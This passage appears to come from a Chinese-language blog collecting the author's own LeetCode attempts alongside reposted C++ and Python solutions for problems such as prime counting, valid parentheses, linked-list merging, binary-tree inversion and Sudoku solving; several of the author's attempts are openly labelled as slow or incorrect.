	for (int i = 2; i < n; ++i)
		sum += (primes[i]) ? 1 : 0;

	/*cout<<temp;*/
	delete[] primes;

	return sum;
}


int countPrimes(int n)
{
	if (n<=2)return 0;

	int sum = 0;
	int sqr = (int)(sqrt((double)(n - 1)));

	vector<bool> prime(n,0);

	for(int i = 2; i < n; ++i)
		prime[i] = 1;

	for(int i =2; i <= sqr; ++i)
	{
		if(prime[i]==1)
		{
			//sum++;
			for(int j = i*i; j < n; j = j+i)
				prime[j] = 0;
		}

	}

	for(int i = 2;i < n; ++i)
		sum += prime[i] ? 1 : 0;


	return sum;
}

int _tmain(int argc, _TCHAR* argv[])
{
	


	cout<<countPrimes(5)<<endl;
	
	cout<<countPrimes1(3)<<endl;

	getchar();
	return 0;
}



超时代码：
 
int countPrimes(int n)
    {
        int sum = 0;
        for(int i = 0 ;i<=n;i=i+2)
        {
            int j = 2;
            int temp = sqrt(i);
            for(;j<=temp;j=j+1)
            {
                if((i%temp)==0)
                {break;}
                sum++;
            }
        }
            
        
        return sum;
    }


纪念一下首次AC
 










Given two strings s and t, determine if they are isomorphic.
Two strings are isomorphic if the characters in s can be replaced to get t.
All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.
For example, 
 Given “egg”, “add”, return true.
Given “foo”, “bar”, return false.
Given “paper”, “title”, return true.
Note: 
 You may assume both s and t have the same length.

我的解决方案：
// isIsomorphic.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


#include<map>
#include<string>
#include<iostream>
#include<unordered_map>

using namespace std;



bool isIsomorphic(string s, string t) 
{
    if(s.length()!=t.length())return false;

    int s_length = s.length();
    int t_length = t.length();
    unordered_map<char,char> stemp;
    unordered_map<char,char> ttemp;

    for(int i = 0;i <  s_length; i++)
    {
        if(stemp.find(s[i]) == stemp.end() && ttemp.find(t[i]) == ttemp.end())
        {
            stemp[s[i]] = t[i];
            ttemp[t[i]] = s[i];
        }
        else
        {
            if(stemp.find(s[i]) == stemp.end() && ttemp[t[i]]!=s[i])
            { 
                return false; 
            }
            else if(ttemp.find(t[i])==ttemp.end() && stemp[s[i]]!=t[i])
            {
                return false; 
            }
            else if(stemp[s[i]] != t[i] && ttemp[t[i]] != s[i])
            { 
                return false; 
            }

        }
    }
}
//
//pair<map<char,int>::iterator,bool> Insert_Pair;
//Insert_Pair = mapString.insert(map<char,int>::value_type(s[i],(int)(s[i] - t[i])));


int _tmain(int argc, _TCHAR* argv[])
{

    string s = "ab";
    string t = "aa";

    isIsomorphic(s,t);
    return 0;
}


unordered_map 简介： 
http://blog.csdn.net/gamecreating/article/details/7698719 
http://blog.csdn.net/orzlzro/article/details/7099231 
http://blog.csdn.net/sws9999/article/details/3081478
unordered_map，它与map的区别就是map是按照operator<比较判断元素是否相同，以及比较元素的大小，然后选择合适的位置插入到树中。所以，如果对map进行遍历（中序遍历）的话，输出的结果是有序的。顺序就是按照operator< 定义的大小排序。而unordered_map是计算元素的Hash值，根据Hash值判断元素是否相同。所以，对unordered_map进行遍历，结果是无序的。而hash则是把数据的存储和查找消耗的时间大大降低；而代价仅仅是消耗比较多的内存。虽然在当前可利用内存越来越多的情况下，用空间换时间的做法是值得的。 
用法的区别就是map的key需要定义operator<。而unordered_map需要定义hash_value函数并且重载operator==。对于自定义的类型做key，就需要自己重载operator< 或者hash_value()了。
python 的解决方案：
def isIsomorphic(self, s, t):
    if len(s) != len(t):
        return False
    def halfIsom(s, t):
        res = {}
        for i in xrange(len(s)):
            if s[i] not in res:
                res[s[i]] = t[i]
            elif res[s[i]] != t[i]:
                return False
        return True
    return halfIsom(s, t) and halfIsom(t, s)
 








Given a string containing just the characters 
'(', ')', '{', '}', '[' and']', determine if the input string is valid.
The brackets must close in the correct order, 
"()" and "()[]{}" are all valid but "(]" and 
"([)]" are not.

写了一个0ms 的代码：


// 20150630.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <stack>
#include <string>
using namespace std;

bool isValid(string s)
{
	if (s=="")return false;

	stack<char> Parentheses;
	int size =s.size();

	Parentheses.push(s[0]);


	for(int i = 1;i < size ;++i)
	{

		if(Parentheses.top()=='('&&s[i]==')'||Parentheses.top()=='['&&s[i]==']'||Parentheses.top()=='{'&&s[i]=='}')
		{
			Parentheses.pop();
			if (Parentheses.empty()&&(i+1)!=size)
			{
				Parentheses.push(s[i+1]);
				i++;
			}
		}

		else
		{
			Parentheses.push(s[i]);
		}


	}

	if(Parentheses.empty())
	{
		return true;
	}
	else
	{
		return false;
	}
}
int _tmain(int argc, _TCHAR* argv[])
{
	string s = "()[]{}";
	isValid(s);
	return 0;
}




另外一个看着好看点的：
class Solution {
    public:
        bool isValid(string s)
        {
            std::stack<char> openStack;
            for(int i = 0; i < s.length(); i++)
            {
                switch(s[i])
                {
                    case '(':
                    case '{':
                    case '[':
                        openStack.push(s[i]);
                        break;
                    case ')':
                        if(!openStack.empty() && openStack.top() == '(' )
                            openStack.pop();
                        else
                            return false;
                        break;
                    case '}':
                        if(!openStack.empty() && openStack.top() == '{' )
                            openStack.pop();
                        else
                            return false;
                        break;
                    case ']':
                        if(!openStack.empty() && openStack.top() == '[' )
                            openStack.pop();
                        else
                            return false;
                        break;

                    default:
                        return false;
                }
            }

            if(openStack.empty())
                return true;
            else
                return false;
        }
    };



python代码：
class Solution:
    # @return a boolean
    def isValid(self, s):
        stack = []
        dict = {"]":"[", "}":"{", ")":"("}
        for char in s:
            if char in dict.values():
                stack.append(char)
            elif char in dict.keys():
                if stack == [] or dict[char] != stack.pop():
                    return False
            else:
                return False
        return stack == []
</pre><pre class="python" name="code">class Solution:
    # @param s, a string
    # @return a boolean
    def isValid(self, s):
        paren_map = {
            '(': ')',
            '{': '}',
            '[': ']'
        }
        stack = []

        for p in s:
            if p in paren_map:
                stack.append(paren_map[p])
            else:
                if not stack or stack.pop() != p:
                    return False

        return not stack

class Solution:
    # @param s, a string
    # @return a boolean
    def isValid(self, s):
        d = {'(':')', '[':']','{':'}'}
        sl = []
        for i in s:
            if i in d:
                sl.append(i)
            else:
                if not sl or d[sl.pop()] != i:
                    return False

        if sl:
            return False
        return True

﻿﻿






﻿﻿
Contains Duplicate 
Total Accepted: 26477 
Total Submissions: 73478 
My Submissions





Given an array of integers, find if the array contains any duplicates. Your function should return true if any value appears at least twice in the array, and it should return false if every element is distinct.

我的解决方案：很显然不是最优的，记录每个插入的状态，看起来也不是很简洁，但是对于方案二的优势是在对于长数组时候，第一个有重复的数字就退出了

class Solution {
public:
    bool containsDuplicate(vector<int>& nums)
    {
        set<int> result;
        
         set<int>::iterator itor ;

    for(int i = 0;i< nums.size();++i)
    {
        itor = result.find(nums[i]) ;

        if(itor != result.end()) 
        {
            return true;
        }
        else
        {
            result.insert(nums[i]);
        }
    }
    
    return false;
 

        
    }
};

非常简洁的解决方案，类似python 了，但是stl 中的set是基于平衡树的，而python中是hash树，所以python可能会高效一些
：
class Solution {
public:
    bool containsDuplicate(vector<int>& nums) {
        return nums.size() > set<int>(nums.begin(), nums.end()).size();        
    }
};
python 的版本：
class Solution:
    def containsDuplicate(self, nums):
        return len(nums) > len(set(nums))


c++ 的hash版本：同类的hash code是相同的，这是一个非常重要的编程思想
class Solution {
public:
    bool containsDuplicate(vector<int>& nums) {
        unordered_set<int> hashset;
        for (int i = 0; i < nums.size(); ++i) {
            if (hashset.find(nums[i]) != hashset.end()) {
                return true;
            }
            else {
                hashset.insert(nums[i]);
            }
        }
        return false;
    }
};



c++排序版本：
+2 votes
942 views
class Solution {
public:
    bool containsDuplicate(vector<int>& nums) 
    {
        int size=nums.size();
        sort(nums.begin(),nums.end());
        nums.erase(unique(nums.begin(),nums.end()),nums.end());
        return (size!=nums.size());
    }
};

+4 votes
Your running time is 28ms, if not use unique, it will be 24ms:
class Solution {
public:
    bool containsDuplicate(std::vector<int>& nums) {
        std::sort(nums.begin(), nums.end());
        for (int i = 1; i < nums.size(); ++i)
            if (nums[i] == nums[i - 1])
                return true;
        return false;
    }
};








 
Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists.
 
我的解决方案：
 
/**
 * Definition for singly-linked list.
 * struct ListNode {
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) {}
 * };
 */
 

class Solution 
{
public:
    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) 
    {
        if(NULL==l1) return l2;
        if(NULL==l2) return l1;
       
         ListNode* head = NULL;
         
         if(l1->val < l2->val)     
         {
             head = l1; 
             l1 = l1->next; 
             
         }
          else                       
         { 
             head = l2; 
             l2 = l2->next;
        }

        ListNode* p = head;     // pointer to form new list
        
        while(l1!=NULL&&l2!=NULL)
        {
            if(l1->val < l2->val)
            {
                p->next = l1;
                l1 = l1 ->next;
            }
            
            else 
            {
                p->next = l2;
                l2 = l2 ->next;
            }
            p = p->next;
        }
        
        if(l1)
        {
            p->next = l1;
        }
        
        else
        {
            p->next = l2;
        }
        
        
        
        return head;
    }
};

 
递归c++解法：
class Solution {
public:
    ListNode *mergeTwoLists(ListNode *l1, ListNode *l2) {
        if(l1 == NULL) return l2;
        if(l2 == NULL) return l1;

        if(l1->val < l2->val) {
            l1->next = mergeTwoLists(l1->next, l2);
            return l1;
        } else {
            l2->next = mergeTwoLists(l2->next, l1);
            return l2;
        }
    }
};


 
 
python递归解决方案：
 
def mergeTwoLists(self, l1, l2):
    if not l1:
        return l2
    elif not l2:
        return l1
    else:
        if l1.val <= l2.val:
            l1.next = self.mergeTwoLists(l1.next, l2)
            return l1
        else:
            l2.next = self.mergeTwoLists(l1, l2.next)
            return l2

 
 
python非递归：
# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None

class Solution:
    # @param {ListNode} l1
    # @param {ListNode} l2
    # @return {ListNode}
    def mergeTwoLists(self, l1, l2):
        p1 = l1
        p2 = l2
        guard = ListNode(0)
        q = guard
        while p1 is not None and p2 is not None:
            if p1.val <= p2.val:
                q.next = p1
                p1 = p1.next
                q = q.next
            else:
                q.next = p2
                p2 = p2.next
                q = q.next
        if p1 is not None:
            q.next = p1
        if p2 is not None:
            q.next = p2
        return guard.next


 
python递归解决方案2：
If both lists are non-empty, I first make sure a starts smaller, use its head as result, and merge the remainders behind it. Otherwise, i.e., if one or both are empty, I just return what's there.

class Solution:
    def mergeTwoLists(self, a, b):
        if a and b:
            if a.val > b.val:
                a, b = b, a
            a.next = self.mergeTwoLists(a.next, b)
        return a or b


 






大牛没有能做出来的题，我们要好好做一做
 
 
Invert a binary tree. 
     4
   /   \
  2     7
 / \   / \
1   3 6   9

to 
     4
   /   \
  7     2
 / \   / \
9   6 3   1
Trivia:
This problem was inspired by 
this original tweet by 
Max Howell: 
Google: 90% of our engineers use the software you wrote (Homebrew), but you can’t invert a binary tree on a whiteboard so fuck off.

 
 递归解决方案：
/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}
 * };
 */
class Solution {
public:
    TreeNode* invertTree(TreeNode* root) 
    {
        if(root ==NULL) return root;
        TreeNode* node = invertTree(root->left);
        root->left = invertTree(root->right);
        root->right = node;
        return root;
    }
};
 
 
非递归解决方案：
 TreeNode* invertTree(TreeNode* root) 
    {
        if(root == NULL)return NULL;
        vector<TreeNode*> stack;
        stack.push_back(root);
        while(!stack.empty())
        {
            TreeNode* node = stack.back();// or stack.top()
            stack.pop_back();
            swap(node->left,node->right);
            if(node->left)stack.push_back(node->left);
            if(node->right)stack.push_back(node->right);
        }
        return root;
    }

 

 python：
def invertTree(self, root):
    if root:
        root.left, root.right = self.invertTree(root.right), self.invertTree(root.left)
        return root


Maybe make it four lines for better readability:

def invertTree(self, root):
    if root:
        invert = self.invertTree
        root.left, root.right = invert(root.right), invert(root.left)
        return root


--------------------------------------------------------------------------------

And an iterative version using my own stack:

def invertTree(self, root):
    stack = [root]
    while stack:
        node = stack.pop()
        if node:
            node.left, node.right = node.right, node.left
            stack += node.left, node.right
    return root


 
 
def invertTree(self, root):
    if root is None:
        return None
    root.left, root.right = self.invertTree(root.right), self.invertTree(root.left)
    return root


python非递归解决方案：
DFS version:

def invertTree(self, root):
        if (root):
            self.invertTree(root.left)
            self.invertTree(root.right)
            root.left, root.right = root.right, root.left
            return root   


BFS version:

def bfs_invertTree(self, root):
        queue = collections.deque()
        if (root):
            queue.append(root)

        while(queue):
            node = queue.popleft()
            if (node.left):
                queue.append(node.left)
            if (node.right):
                queue.append(node.right)
            node.left, node.right = node.right, node.left

        return root


 







Remove Duplicates from Sorted ArrayTotal Accepted:
66627 Total Submissions:
212739 
My Submissions 
                      




Given a sorted array, remove the duplicates in place such that each element appear onlyonce and return the new length.
Do not allocate extra space for another array, you must do this in place with constant memory.
For example,
Given input array nums = [1,1,2], 
Your function should return length = 2, with the first two elements ofnums being
1 and 2 respectively. It doesn't matter what you leave beyond the new length





64ms好像有点慢了，这个方法有点讨巧了，绕过了算法的部分，以后还是少写这样的代码，多练习算法
我的解决方案：
class Solution {
public:
    int removeDuplicates(vector<int>& nums)
    {
        set<int> result;
        for(int i = 0;i< nums.size();i++)
        {
            result.insert(nums[i]);
        }
        nums.clear();
        set<int>::iterator iter = result.begin();
        for(;iter!=result.end();iter++)
        {
            nums.push_back(*iter);
        }
        return nums.size();
    }
};


class Solution {
public:
    int removeDuplicates(vector<int>& nums) {
        int start=1,N = nums.size();
        if(N<=1) return N;
        for(int i=1;i<nums.size();i++) {
            if(nums[i]!=nums[i-1]){
                nums[start]=nums[i];
                start++;
            }
        }
        return start;
    }
};


一行代码的STL:
class Solution { public: int removeDuplicates(int A[], int n) { return distance(A, unique(A, A+n)); } };

int removeDuplicates(vector<int>& nums) {
    if(nums.size() <= 1) return nums.size();

    vector<int>::iterator it1,it2;
    for(it1=nums.begin(),it2=nums.begin()+1; it2 != nums.end();) {
        if(*it2 == *it1) it2=nums.erase(it2);
        else {it1++;it2++;}
    }

    return nums.size();
}   

python解决方案：
class Solution:
    # @param a list of integers
    # @return an integer
    def removeDuplicates(self, A):
        if not A:
            return 0

        newTail = 0

        for i in range(1, len(A)):
            if A[i] != A[newTail]:
                newTail += 1
                A[newTail] = A[i]

        return newTail + 1



﻿﻿






﻿﻿
Remove Element 
Total Accepted: 60351 
Total Submissions: 187833 
My Submissions
                      




Given an array and a value, remove all instances of that value in place and return the new length.

The order of elements can be changed. It doesn't matter what you leave beyond the new length.


Show Tags


c++ 解决方案：

class Solution {
public:
    int removeElement(vector<int>& nums, int val) {
        int n = nums.size();
        int i = 0;
        while( i < n ) { 
            if( nums[i] == val ) {
                swap(nums[i], nums[n-1]);
                n--;
            } else {
                i++;
            }
        }
        return n;
    }
};


int removeElement(vector<int>& nums, int val)
{
    vector<int>::iterator  itr = nums.begin();
    while (itr != nums.end())
    {
        if (*itr == val)
            itr = nums.erase(itr);
        else
            ++itr;
    }
    return nums.size();
}


int removeElement(int A[], int n, int elem) {
    int begin=0;
    for(int i=0;i<n;i++) if(A[i]!=elem) A[begin++]=A[i];
    return begin;
}

python解决方案：
class Solution:
# @param    A       a list of integers
# @param    elem    an integer, value need to be removed
# @return an integer
def removeElement(self, A, elem):
    i = 0
    for j in range(len(A)):
        if A[j] != elem:
            A[i] = A[j]
            i += 1
    return i


史上最简洁的解决方案：
def removeElement(self, nums, val):
        nums[:] = [x for x in nums if x!=val]
        return len(nums)











You are given two linked lists representing two non-negative numbers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.

Input: (2 -> 4 -> 3) + (5 -> 6 -> 4)
Output: 7 -> 0 -> 8
我的想法有点复杂，就是两个加数全部逆置，就是遍历放到栈里面，完后出栈加起来放在容器中，返回链表
但是这个算法好像有错误，
非常不解：



// addtwonumber.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <stack>
#include <vector>

using namespace std;

struct ListNode {
	     int val;
	     ListNode *next;
	     ListNode(int x) : val(x), next(NULL) {}
	 };

ListNode* addTwoNumbers(ListNode* l1, ListNode* l2)
{
	ListNode* temp1 = l1;
	ListNode* temp2 = l2;
	stack<int> s_int1,s_int2;
	vector<int> v_int;


	
	int length = 0,length1 = 0,length2 =0;
	while(temp1)
	{
		++length1;
		
		s_int1.push(temp1->val);
		temp1 = temp1->next;
		
	}

	while(temp2)
	{
		++length2;
		

		s_int2.push(temp2->val);
		temp2 = temp2->next;
	}

	length = length1>length2?length1:length2;
	int jinwei = 0;
	int flag = 0;
	int value1 = 0;
	int value2 = 0;

	while(!s_int1.empty()||!s_int2.empty()||flag)
	{
		if (!s_int1.empty())
		{
			value1 = s_int1.top();
			s_int1.pop();
		}
		else
		{
		value1 = 0;
		}
		if (!s_int2.empty())
		{

			value2 = s_int2.top();
			s_int2.pop();
		}
		else
		{
		value2 = 0;
		}
		
		

		jinwei = value1 + value2  + flag;
		
			v_int.push_back(jinwei%10);
			jinwei = jinwei/10;
			

	}



	ListNode* result = (ListNode* )malloc(sizeof(ListNode));
	result->val = v_int[0];
	
	ListNode* t = NULL;
	
	ListNode* r = result;
	for(int i = 1; i <length;++i)
	{
		t = (ListNode* )malloc(sizeof(ListNode));
		t->val = v_int[i];
		t->next = NULL;
		r->next = t;
		r = t;
	   

	}
	return result;

}

int _tmain(int argc, _TCHAR* argv[])
{

	ListNode n1(1),n2(2),n3(3); 

	n1.next = &n2;
	n2.next = &n3;

	ListNode n4(9),n5(5),n6(6);
	n4.next = &n5;
	//n5.next = &n6;


	ListNode l1(1),l2(0);

	addTwoNumbers(&n1,&n4);
	addTwoNumbers(&l1,&l2);
	return 0;
}

正确的代码：非常简介

基本思路差不多

ListNode *addTwoNumbers(ListNode *l1, ListNode *l2) 
{
    ListNode preHead(0), *p = &preHead;
    int extra = 0;
    while (l1 || l2 || extra) {
        if (l1) extra += l1->val, l1 = l1->next;
        if (l2) extra += l2->val, l2 = l2->next;
        p->next = new ListNode(extra % 10);
        extra /= 10;
        p = p->next;
    }
    return preHead.next;
}

ListNode *addTwoNumbers(ListNode *l1, ListNode *l2)
 {
    ListNode preHead(0), *p = &preHead;
    int extra = 0;
    while (l1 || l2 || extra) {
        int sum = (l1 ? l1->val : 0) + (l2 ? l2->val : 0) + extra;
        extra = sum / 10;
        p->next = new ListNode(sum % 10);
        p = p->next;
        l1 = l1 ? l1->next : l1;
        l2 = l2 ? l2->next : l2;
    }
    return preHead.next;
}
python代码：


class Solution:
# @return a ListNode
def addTwoNumbers(self, l1, l2):
    carry = 0
    root = n = ListNode(0)
    while l1 or l2 or carry:
        v1 = v2 = 0
        if l1:
            v1 = l1.val
            l1 = l1.next
        if l2:
            v2 = l2.val
            l2 = l2.next
        carry, val = divmod(v1+v2+carry, 10)
        n.next = ListNode(val)
        n = n.next
    return root.next


def addTwoNumbers(self, l1, l2):
        carry = 0;
        res = n = ListNode(0);
        while l1 or l2 or carry:
            if l1:
                carry += l1.val
                l1 = l1.next;
            if l2:
                carry += l2.val;
                l2 = l2.next;
            carry, val = divmod(carry, 10)
            n.next = n = ListNode(val);
        return res.next;








三星机试也考了类似的题目，只不过是要针对给出的数独修改其中三个错误数字，总过10个测试用例只过了3个与世界500强无缘了
36. Valid Sudoku
 
Determine if a Sudoku is valid, according to: Sudoku Puzzles - The Rules.
The Sudoku board could be partially filled, where empty cells are filled with the character '.'.

A partially filled sudoku which is valid.
 
Note:
A valid Sudoku board (partially filled) is not necessarily solvable. Only the filled cells need to be validated.
 
Subscribe to see which companies asked this question
 
 
 
Idea
Just go through all you see (like "7 in row 3") and check for duplicates.
Solution 1
Using Counter. One logical line, seven physical lines.

def isValidSudoku(self, board):
    return 1 == max(collections.Counter(
        x
        for i, row in enumerate(board)
        for j, c in enumerate(row)
        if c != '.'
        for x in ((c, i), (j, c), (i/3, j/3, c))
    ).values() + [1])

The + [1] is only for the empty board, where max would get an empty list and complain. It's not necessary to get it accepted here, as the empty board isn't among the test cases, but it's good to have.
Solution 2
Using len(set).

def isValidSudoku(self, board):
    seen = sum(([(c, i), (j, c), (i/3, j/3, c)]
                for i, row in enumerate(board)
                for j, c in enumerate(row)
                if c != '.'), [])
    return len(seen) == len(set(seen))

Solution 3
Using any.

def isValidSudoku(self, board):
    seen = set()
    return not any(x in seen or seen.add(x)
                   for i, row in enumerate(board)
                   for j, c in enumerate(row)
                   if c != '.'
                   for x in ((c, i), (j, c), (i/3, j/3, c)))

Solution 4
Iterating a different way.

def isValidSudoku(self, board):
    seen = sum(([(c, i), (j, c), (i/3, j/3, c)]
                for i in range(9) for j in range(9)
                for c in [board[i][j]] if c != '.'), [])
    return len(seen) == len(set(seen))
 
 
 
 
Clean and Easy82ms Python
+11votes
402 views
class Solution(object):

def isValidSudoku(self, board):
    """
    :type board: List[List[str]]
    :rtype: bool
    """
    big = set()
    for i in xrange(0,9):
        for j in xrange(0,9):
            if board[i][j]!='.':
                cur = board[i][j]
                if (i,cur) in big or (cur,j) in big or (i/3,j/3,cur) in big:
                    return False
                big.add((i,cur))
                big.add((cur,j))
                big.add((i/3,j/3,cur))
 
 
37. Sudoku Solver
Write a program to solve a Sudoku puzzle by filling the empty cells.
Empty cells are indicated by the character '.'.
You may assume that there will be only one unique solution.

A sudoku puzzle...
 

...and its solution numbers marked in red.
 
Subscribe to see which companies asked this question
最快的解决方案：
 
 
Sharing my 2ms C++ solution with comments and explanations.
+37votes
3,937 views
Update: there's a follow-up 0ms solution which is even more optimized
This is one of the fastest Sudoku solvers I've ever written. It is compact enough - just 150 lines of C++ code with comments. I thought it'd be interesting to share it, since it combines several techniques like reactive network update propagation and backtracking with very aggressive pruning.
The algorithm is online - it starts with an empty board and as you add numbers to it, it starts solving the Sudoku.
Unlike in other solutions where you have bitmasks of allowed/disallowed values per row/column/square, this solution track bitmask for every(!) cell, forming a set of constraints for the allowed values for each particular cell. Once a value is written into a cell, new constraints are immediately propagated to row, column and 3x3 square of the cell. If during this process a value of other cell can be unambiguously deduced - then the value is set, new constraints are propagated, so on.... You can think about this as an implicit reactive network of cells.
If we're lucky (and we'll be lucky for 19 of 20 of Sudokus published in magazines) then Sudoku is solved at the end (or even before!) processing of the input.
Otherwise, there will be empty cells which have to be resolved. Algorithm uses backtracking for this purpose. To optimize it, algorithm starts with the cell with the smallest ambiguity. This could be improved even further by using priority queue (but it's not implemented here). Backtracking is more or less standard, however, at each step we guess the number, the reactive update propagation comes back into play and it either quickly proves that the guess is unfeasible or significantly prunes the remaining search space.
It's interesting to note, that in this case taking and restoring snapshots of the compact representation of the state is faster than doing backtracking rollback by "undoing the moves".

class Solution {
    struct cell // encapsulates a single cell on a Sudoku board
    {
        uint8_t value; // cell value 1..9 or 0 if unset
        // number of possible (unconstrained) values for the cell
        uint8_t numPossibilities;
        // if bitset[v] is 1 then value can't be v
        bitset<10> constraints;
        cell() : value(0), numPossibilities(9),constraints() {};
    };
    array<array<cell,9>,9> cells;

    // sets the value of the cell to [v]
    // the function also propagates constraints to other cells and deduce new values where possible
    bool set(int i, int j, int v)
    { 
        // updating state of the cell
        cell& c = cells[i][j];
        if (c.value == v)
            return true;
        if (c.constraints[v])
            return false;
        c.constraints = bitset<10>(0x3FE); // all 1s
        c.constraints.reset(v);
        c.numPossibilities = 1;
        c.value = v;

        // propagating constraints
        for (int k = 0; k<9; k++) {
            // to the row: 
            if (i != k && !updateConstraints(k, j, v))
                return false;
            // to the column:
            if (j != k && !updateConstraints(i, k, v))
                return false;
            // to the 3x3 square:
            int ix = (i / 3) * 3 + k / 3;
            int jx = (j / 3) * 3 + k % 3;
            if (ix != i && jx != j && !updateConstraints(ix, jx, v))
                return false;
        }
        return true;
    }
    // update constraints of the cell i,j by excluding possibility of 'excludedValue'
    // once there's one possibility left the function recurses back into set()
    bool updateConstraints(int i, int j, int excludedValue)
    {
        cell& c = cells[i][j];
        if (c.constraints[excludedValue]) {
            return true;
        }
        if (c.value == excludedValue) {
            return false;
        }
        c.constraints.set(excludedValue);
        if (--c.numPossibilities > 1)
            return true;
        for (int v = 1; v <= 9; v++) {
            if (!c.constraints[v]) {
                return set(i, j, v);
            }
        }
        assert(false);
    }

    // backtracking state - list of empty cells
    vector<pair<int, int>> bt;

    // find values for empty cells
    bool findValuesForEmptyCells()
    {
        // collecting all empty cells
        bt.clear();
        for (int i = 0; i < 9; i++) {
            for (int j = 0; j < 9; j++) {
                if (!cells[i][j].value)
                    bt.push_back(make_pair(i, j));
            }
        }
        // making backtracking efficient by pre-sorting empty cells by numPossibilities
        sort(bt.begin(), bt.end(), [this](const pair<int, int>&a, const pair<int, int>&b) {
            return cells[a.first][a.second].numPossibilities < cells[b.first][b.second].numPossibilities; });
        return backtrack(0);
    }

    // Finds value for all empty cells with index >=k
    bool backtrack(int k)
    {
        if (k >= bt.size())
            return true;
        int i = bt[k].first;
        int j = bt[k].second;
        // fast path - only 1 possibility
        if (cells[i][j].value)
            return backtrack(k + 1);
        auto constraints = cells[i][j].constraints;
        // slow path >1 possibility.
        // making snapshot of the state
        array<array<cell,9>,9> snapshot(cells);
        for (int v = 1; v <= 9; v++) {
            if (!constraints[v]) {
                if (set(i, j, v)) {
                    if (backtrack(k + 1))
                        return true;
                }
                // restoring from snapshot,
                // note: computationally this is cheaper
                // than alternative implementation with undoing the changes
                cells = snapshot;
            }
        }
        return false;
    }
public:
    void solveSudoku(vector<vector<char>> &board) {
        cells = array<array<cell,9>,9>(); // clear array
        // Decoding input board into the internal cell matrix.
        // As we do it - constraints are propagated and even additional values are set as we go
        // (in the case if it is possible to unambiguously deduce them).
        for (int i = 0; i < 9; i++)
        {
            for (int j = 0; j < 9; j++) {
                if (board[i][j] != '.' && !set(i, j, board[i][j] - '0'))
                    return; // sudoku is either incorrect or unsolvable
            }
        }
        // if we're lucky we've already got a solution,
        // however, if we have empty cells we need to use backtracking to fill them
        if (!findValuesForEmptyCells())
            return; // sudoku is unsolvable

        // copying the solution back to the board
        for (int i = 0; i < 9; i++)
        {
            for (int j = 0; j < 9; j++) {
                if (cells[i][j].value)
                    board[i][j] = cells[i][j].value + '0';
            }
        }
    }
};
 
 
Simple and Clean Solution / C++
+14votes
871 views

bool check(vector<vector<char>> &board, int i, int j, char val)
{
    int row = i - i%3, column = j - j%3;
    for(int x=0; x<9; x++) if(board[x][j] == val) return false;
    for(int y=0; y<9; y++) if(board[i][y] == val) return false;
    for(int x=0; x<3; x++)
    for(int y=0; y<3; y++)
        if(board[row+x][column+y] == val) return false;
    return true;
}
bool solveSudoku(vector<vector<char>> &board, int i, int j)
{
    if(i==9) return true;
    if(j==9) return solveSudoku(board, i+1, 0);
    if(board[i][j] != '.') return solveSudoku(board, i, j+1);

    for(char c='1'; c<='9'; c++)
    {
        if(check(board, i, j, c))
        {
            board[i][j] = c;
            if(solveSudoku(board, i, j+1)) return true;
            board[i][j] = '.';
        }
    }

    return false;
}

public: void solveSudoku(vector<vector>& board) { solveSudoku(board, 0, 0); }
 
 
c++ clear solution using dfs, beating 90% c++ coder.
+10votes
690 views

class Solution {
public:
    bool col[10][10],row[10][10],f[10][10];
    bool flag = false;
    void solveSudoku(vector<vector<char>>& board) {
         memset(col,false,sizeof(col));
         memset(row,false,sizeof(row));
         memset(f,false,sizeof(f));
         for(int i = 0; i < 9;i++){
             for(int j = 0; j < 9;j++){
                 if(board[i][j] == '.')   continue;
                 int temp = 3*(i/3)+j/3;
                 int num = board[i][j]-'0';
                 col[j][num] = row[i][num] = f[temp][num] = true;
             }
         }
         dfs(board,0,0);
    }
    void dfs(vector<vector<char>>& board,int i,int j){
        if(flag == true)  return ;
        if(i >= 9){
            flag = true;
            return ;
        }
        if(board[i][j] != '.'){
             if(j < 8)  dfs(board,i,j+1);
             else dfs(board,i+1,0);
             if(flag)  return;
        }

        else{
            int temp = 3*(i/3)+j/3;
            for(int n = 1; n <= 9; n++){
                if(!col[j][n] && !row[i][n] && !f[temp][n]){
                    board[i][j] = n + '0';
                    col[j][n] = row[i][n] = f[temp][n] = true;
                    if(j < 8)  dfs(board,i,j+1);
                    else dfs(board,i+1,0);
                    col[j][n] = row[i][n] = f[temp][n] = false;
                    if(flag)  return;
                }
            }
            board[i][j] = '.';
        }
    }
};
 
13-line Python solution, dfs, beats 47.79%
+1vote
77 views

def solveSudoku(self, board):
  def dfs():
    for i, row in enumerate(board):
      for j, char in enumerate(row):
        if char == '.':
          for x in s9 - {row[k] for k in r9} - {board[k][j] for k in r9} - \
              {board[i / 3 * 3 + m][j / 3 * 3 + n] for m in r3 for n in r3}:
            board[i][j] = x
            if dfs(): return True
            board[i][j] = '.'
          return False
    return True

  r3, r9, s9 = range(3), range(9), {'1', '2', '3', '4', '5', '6', '7', '8', '9'}
  dfs()
 
 
参考文献：
 
http://www.cnblogs.com/felixfang/p/3705754.html






Given a string, find the length of the longest substring without repeating characters. For example, the longest substring without
 repeating letters for "abcabcbb" is "abc", which the length is 3. For "bbbbb" the longest substring is "b", with the length of 1.

这个应该是一个典型的动态规划问题：http://bbs.csdn.net/topics/310174805
直观地得到一个思路，表达起来真够难的，直接写代码要更容易以abcbef这个串为例用一个数据结构pos记录每个元素曾出现的下标，初始为-1从s[0]开始，pos['a'] == -1，说明a还未出现过，令pos['a'] = 0，视为将a"加入当前串"，同时长度++同理令pos['b'] = 1,pos['c'] = 2到s[3]时，pos['b'] != -1，说明'b'在前面已经出现过了，此时可得到一个不重复串"abc"，刷新当前的最大长度，然后做如下处理：pos[s[0~2]] = -1，亦即将"ab""移出当前串"，同时当前长度减去3重复以上过程
int lengthOfLongestSubstring(string s) {
        vector<int> dict(256, -1);
        int maxLen = 0, start = -1;
        for (int i = 0; i != s.length(); i++) {
